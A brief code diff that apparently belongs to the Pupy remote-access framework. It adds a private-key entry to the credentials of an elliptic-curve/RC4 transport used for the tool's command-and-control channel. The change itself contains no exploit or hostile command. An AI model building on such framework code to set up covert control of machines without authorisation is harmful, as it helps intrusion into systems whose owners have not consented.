@@ -10,13 +10,14 @@ class TransportConf(Transport):
     stream = PupySocketStream
     client_transport = EC4TransportClient
     server_transport = EC4TransportServer
-    credentials = [ 'ECPV_RC4_PUBLIC_KEY' ]
+    credentials = [ 'ECPV_RC4_PUBLIC_KEY', 'ECPV_RC4_PRIVATE_KEY' ]
 
     def __init__(self, *args, **kwargs):
         Transport.__init__(self, *args, **kwargs)
         try:
             import pupy_credentials
             PUB_KEY = pupy_credentials.ECPV_RC4_PUBLIC_KEY
+            PRIV_KEY = pupy_credentials.ECPV_RC4_PRIVATE_KEY
 
         except:
             from pupylib.PupyCredentials import Credentials
